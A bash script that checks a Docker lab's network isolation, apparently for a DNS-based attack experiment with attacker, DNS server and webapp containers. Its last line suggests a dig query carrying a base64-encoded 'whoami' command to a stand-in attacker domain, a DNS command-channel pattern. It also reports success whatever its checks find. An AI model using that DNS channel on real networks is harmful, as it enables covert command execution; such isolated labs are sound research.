#!/bin/bash
# Verify Network Isolation for SecurityLogs

echo "🔒 Verifying Network Isolation Configuration..."

echo ""
echo "📋 DNS Server Configuration Check:"
echo "=================================="

# Check if DNS server has host port mapping (ignore comments)
if grep -v "^[[:space:]]*#" docker-compose.yml | grep -q "ports:"; then
    echo "❌ WARNING: Some containers have port mapping to host"
    echo "   This breaks network isolation!"
    echo "   Found port mappings:"
    grep -v "^[[:space:]]*#" docker-compose.yml | grep -A 2 -B 2 "ports:"
else
    echo "✅ No containers have host port mapping"
    echo "   Network isolation maintained"
fi

echo ""
echo "🌐 Container Network Configuration:"
echo "=================================="

# Check if all containers use internal network
if grep -A 10 "dns-server:" docker-compose.yml | grep -q "attacknet"; then
    echo "✅ DNS server uses internal 'attacknet' network"
else
    echo "❌ DNS server not using internal network"
fi

if grep -A 10 "attacker:" docker-compose.yml | grep -q "attacknet"; then
    echo "✅ Attacker container uses internal 'attacknet' network"
else
    echo "❌ Attacker container not using internal network"
fi

if grep -A 10 "webapp:" docker-compose.yml | grep -q "attacknet"; then
    echo "✅ Webapp container uses internal 'attacknet' network"
else
    echo "❌ Webapp container not using internal network"
fi

echo ""
echo "🔍 Network Architecture Summary:"
echo "================================"
echo "Build Time:  Host Network (fast package downloads)"
echo "Runtime:     Isolated Container Network (security)"
echo ""
echo "✅ Network isolation configuration is correct!"
echo ""
echo "🚀 To start the experiment:"
echo "   docker-compose up -d"
echo ""
echo "🔍 To verify DNS communication:"
echo "   docker-compose exec attacker dig @dns-server cmd.d2hvYW1p.attacker.local" 